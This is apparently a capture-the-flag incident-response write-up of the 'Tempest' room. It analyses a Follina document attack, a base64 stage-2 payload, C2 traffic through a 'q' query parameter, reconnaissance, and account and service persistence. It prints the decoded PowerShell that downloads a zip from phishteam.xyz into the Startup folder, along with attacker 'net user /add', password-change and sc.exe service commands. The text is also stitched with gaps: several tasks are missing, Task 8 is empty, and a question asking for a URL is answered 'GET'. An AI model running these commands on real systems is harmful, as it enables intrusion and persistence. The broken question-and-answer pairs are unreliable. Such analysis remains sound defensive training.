## TASK 1 - Introduction

This room walks through a full incident response investigation on the Tempest machine, tracing an attack chain from initial access via a malicious Word document, through a base64-encoded stage 2 payload and C2 traffic, internal reconnaissance, lateral movement via a reverse SOCKS proxy, privilege escalation, and finally persistence through newly created administrator accounts. The investigation draws on Sysmon logs, Windows Event Logs, and packet capture, using EvtxEcmd, Timeline Explorer, SysmonView, Wireshark, and Brim.

Process of understanding events generated by a computer. A log file is a list of tracked activities in an application or system.

## TASK 4 - Initial Access - Malicious Document

### Tempest Incident

Acting as the Incident Responder on a CRITICAL-severity alert triaged by a SOC analyst, the intrusion traces back to a malicious `.doc` file, downloaded via `chrome.exe`, which then ran a chain of commands to achieve code execution.

### Investigation Guide

  - Start with the events generated by Sysmon.
  - EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
  - Follow the child processes of WinWord.exe.
  - Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
  - We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.

Significant Data Sources:
  - Sysmon

OSINT in action. I googled the entire Executable Info and found the Follina vulnerability, CVE-2022-30190.

What actually fingerprints it is not the base64 — that's generic obfuscation you'd see in any malicious macro. It's the three pieces sitting together in the command line: **`msdt.exe` launched via the `ms-msdt:` URI scheme**, the **`PCWDiagnostic` diagnostic ID with `/skip force`**, and the **`IT_BrowseForFile=` parameter smuggling a command with a `../../..` traversal into `mpsigstub.exe`**. ## TASK 5 - Initial Access - Stage 2 execution

### Malicious Document - Stage 2

The document successfully executed an encoded base64 command; decoding it reveals the exact command chain the document ran.

### Investigation Guide

With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:
  - The Autostart execution reflects explorer.exe as its parent process ID.
  - Child processes of explorer.exe within the event timeframe could be significant.
  - Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.

Significant Data Sources:
  - Sysmon

### Decoding the Stage 2 Payload

Before anything else, decode the base64 from the last task — everything in this task follows from it. Dropped into CyberChef (From Base64):

```
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;
```

Reading it line by line, this tells us exactly what to go looking for:

1. Resolve the user's AppData path and **cd into the Startup folder** — that's the persistence location.
2. **Download `update.zip`** from phishteam.xyz.
3. **Extract it into that Startup folder.**
4. **Delete the zip** to clean up after itself.

So the file we're hunting for in the next question landed in Startup via `Expand-Archive`, and whatever came out of that zip is what will run at every login. This is why filtering Event ID 11 on the word **startup** works — we're not guessing, the payload told us where it wrote.

Also worth noting: the attacker deletes `update.zip` afterward, so the zip itself may not be sitting on disk anymore. The Event ID 11 file-creation record is the evidence that it was ever there.

**The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**

Looking at the request URI, the structure is `GET /9ab62b5?q=<base64>`. Decoding the `q=` value returns command output in plaintext, so **`q`** is the parameter carrying the results back to the attacker.

This is the single most useful thing to understand in this room, because the whole rest of the investigation runs on it — every command the attacker executed and every result they got back is sitting in the pcap inside a `q=` value.

**Answer:** q

**The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?**

<p align="center">
<img src=screenshots/tempest-c2connect.png width="700">
</p>

Sorting the filtered traffic by length makes the pattern obvious. The requests come in pairs:

- **Bare `GET /9ab62b5`** with no parameter (all 161 bytes) — the implant **polling** for its next command.

Every request in the C2 stream is a GET, including the ones exfiltrating command output through the query string. Stuffing results into a URL parameter instead of a POST body is a decent evasion choice — GET requests to a web server look far more ordinary in traffic logs.

**Answer:** GET

## TASK 7 - Discovery - Internal Reconnaissance

### Internal Reconnaissance

The malicious binary continuously uses the C2 traffic, which carries an encoded string of the commands the attacker ran and their output.

### Investigation Guide

To continue with the investigation, we may focus on the following information:
  - Find network and process events connecting to the malicious domain.
  - Find network events that contain an encoded command.
  - We can use Brim to filter all packets containing the encoded string.
  - Look for endpoint enumeration commands since the attacker is already inside the machine.

In addition, we may refer to our cheatsheet for Brim to quickly investigate the encoded traffic with the following filter — to get all HTTP requests related to the malicious C2 traffic:
```
_path=="http" "resolvecyber.xyz" id.resp_p==8080 | cut ts, host, id.resp_p, uri | sort ts
```

Significant Data Sources:
  - Packet Capture
  - Sysmon

### Reading Base64 by its Prefix

Decoding these one at a time is slow, and there are dozens. Two things make it fast:

**Triage by length first.** Every 161-byte request is a bare poll with no `q=` at all — skip all of them. Only requests with a `q=` value carry output, and bigger length means more output returned.

**Read the first 4–6 characters to identify the command without decoding.** Base64 encodes in fixed 3-byte to 4-character blocks, so the same command always produces the same opening characters:

| Prefix | Command |
|---|---|
| `d2hvYW1p` | whoami |
| `cHdk` | pwd |
| `ZGly` | dir |
| `bmV0` | net |
| `bmV0c3RhdA` | netstat |
| `dHlw` | type |
| `Y2F0` | cat |
| `bW9y` | more |
| `R2V0` | Get-... |
| `cG93` | powershell |

Applying that, the attacker's recon sequence reads straight off the Info column with no decoding at all: `whoami` → `pwd` → `dir C:\Users` → `net users` → `net localgroup administrators` → `net user benimaru` → `dir C:\Users\benimaru`. The file-read prefixes (`dHlw`, `Y2F0`, `bW9y`, `R2V0`) are the ones that tell an SOC the attacker is **reading** a file, which is what we want for the next question.

**CyberChef tip:** Windows console output ends lines with CRLF, but CyberChef's output pane defaults to LF, so `dir` and `netstat` results come out as an unreadable wall with red control-character marks everywhere. Flip the output pane from **LF to CRLF** and the columns line up properly.

**The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?**

Caught the netstat request by its prefix — `q=bmV0c3RhdA...` decodes to `netstat -ano -p tcp`. It was also the largest request in the whole capture, which fits a full connection table.

**Big lesson on this one.** My first decode came out truncated and died after the first line. When Wireshark shows **[truncated]** on a field, or a `…` in the Info column, there is more data than it is rendering — the dissector won't print a URI that long inline, and at 3,000+ bytes the request is reassembled across multiple TCP segments anyway. Copying from those fields gets you half the data. **Right-click the frame → Follow → HTTP Stream** to get the full raw request. Two sanity checks that would have caught it instantly: my paste was 195 characters for a 3,000-byte request, and the base64 ended mid-string instead of on a clean `=` / `==` boundary.

Then filter the decoded output to the LISTENING lines and eliminate everything that ships with Windows by default — **135** (RPC endpoint mapper), **139** and **445** (NetBIOS/SMB), **3389** (RDP), **5040** and **7680**, **47001**, **5357** (WSDAPI device discovery), and the whole **49664–49676** dynamic RPC range. That leaves one port that has no business being on a workstation: **5985**, which is **WinRM over HTTP** — PowerShell Remoting. That's an interactive shell to anyone who can authenticate.

Which sets up the next two answers: WinRM listens on `0.0.0.0:5985` so it's network-reachable, but the attacker is stuck behind NAT with only a base64-over-HTTP channel. That's exactly why they stand up a reverse SOCKS proxy — to tunnel back in and reach 5985 directly with the credential they just stole.

**Answer:** 5985

## TASK 8 - Privilege Escalation - Exploiting Privileges

### Privilege Escalation

With a stable shell through the reverse SOCKS proxy, the attacker now moves to escalate privileges, having already established persistent low-privilege access.

### Investigation Guide

With this, we can focus on the following network and endpoint events:

## TASK 9 - Actions on Objective - Fully-owned Machine

### Fully-Owned Machine

With administrative privileges secured, the goal now is to map out every persistence technique the attacker put in place, all tied to the same malicious C2 binary used during privilege escalation.

### Investigation Guide

Now we can rely on our cheatsheet to investigate events after a successful privilege escalation:

  - Useful Brim filter to get all HTTP requests related to the malicious C2 traffic: `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts`
  - The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with NT Authority\System.
  - All child events of the new malicious binary used for C2 are worth checking.

Significant Data Sources:
  - Packet Capture
  - Sysmon
  - Windows Event Logs

This is the first task that calls for **Windows Event Logs**, so if you haven't parsed `windows.evtx` into its own CSV yet, do it now (see Task 3). Sysmon shows us the **commands the attacker typed**, including the ones that failed; the Security log confirms which attempts **actually succeeded**. We need both.

---

**Upon achieving SYSTEM access, the attacker then created two users. What are the account names?**
Format: Answer in alphabetical order - comma delimited

<p align="center">
<img src=screenshots/tempest-shion.png width="700">
</p>

Viewing Timeline Explorer, we can filter to see both successful user creations and failed attempts. Query: `net user`

I deliberately searched the command **stem** rather than `net user /add`. Filtering on the flag would return only the successful creations and completely miss the failures — which is what the very next question asks about. General rule: filter on the stem, because the flag is exactly what varies between a broken attempt and a working one.

One thing that looks like a duplicate but isn't: every command appears twice, once as `net.exe` and once as `net1.exe`. That's normal Windows behavior — `net.exe` hands most subcommands off to `net1.exe`, so Sysmon logs both process creations. Not the attacker running things twice.

**Answer:** shion, shuna

---

**Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?**

<p align="center">
<img src=screenshots/tempest-add.png width="700">
</p>

Since we filtered by `net user`, this gives us a wider search net, allowing us to see both the successful user additions and the failed attempts.

The failed one is `cmd.exe /c net user shion m4st3rch3f!!!` — without `/add`, `net user <name> <password>` means "set the password on an **existing** account." `shion` didn't exist yet, so it errored out. The attacker corrects it two steps later with `net user /add shion m4st3rch3f!` (note the password also changed from three exclamation marks to one).

**Answer:** /add

**Additional Investigation:** `2022-06-20 17:23:54` — Event Record 9838: `"C:\Windows\system32\net.exe" user Administrator ch4ng3dpassword!`

Same syntax as the failed attempt above, but this one **succeeded** — because the built-in `Administrator` account already existed, so no `/add` was needed. The attacker changed the local Administrator's password. The room never asks about this, but in a real case it's the first thing I'd escalate: the account responders would use to remediate the box now has an attacker-chosen credential. It's also the counterexample that proves why `/add` was the missing piece — identical syntax, opposite outcome, and the only difference is whether the target account existed.

---

**Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?**

This number should be second nature to a SOC: **4720 — a user account was created**. It fires in the Security log regardless of *how* the account was made (`net user`, `New-LocalUser`, ADSI), which makes it more reliable than command-line hunting alone.

**Answer:** 4720

**After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?**
Format: Remove the double quotes from the log.

<p align="center">
<img src=screenshots/tempest-4732.png width="700">
</p>

`sc.exe create` registers a **Windows service** pointing at `final.exe` with `start= auto`. That's a second, sturdier persistence mechanism layered on top of the Startup folder trick from the beginning: services run as SYSTEM, start before any user logs in, and survive reboots without needing anyone to sign in at all. Two accounts plus a service means removing any single one of them doesn't evict the attacker.

**Lesson learned from this room:** keep my own running case notes with a timeline, separate from the write-up. The constant back-and-forth — being asked at the end about something that happened much earlier — is exactly what running notes solve. Relevance is only obvious in hindsight, so log anything that looks off **with its timestamp and a pointer** (frame number, event record ID, CSV row) the moment you see it, even if it doesn't answer the question in front of you.

**Answer:** C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto

## TASK 10 - Conclusion

This incident traces a complete attack chain: initial access through a malicious Word document exploiting Follina (CVE-2022-30190), a base64-encoded stage 2 payload dropping into the Startup folder for persistence, C2 over a base64-encoded HTTP channel, internal reconnaissance and credential harvesting from a sensitive file, a Chisel reverse SOCKS proxy tunnelling back in to reach WinRM on 5985, privilege escalation to SYSTEM via PrintSpoofer abusing SeImpersonatePrivilege, and finally persistence through two new accounts — one added to the local Administrators group — plus a Windows service pointing at the C2 binary. The built-in Administrator password was also changed along the way. The case closes with a full timeline and the IOCs — domains, hashes, binaries, accounts — documented for containment and remediation.
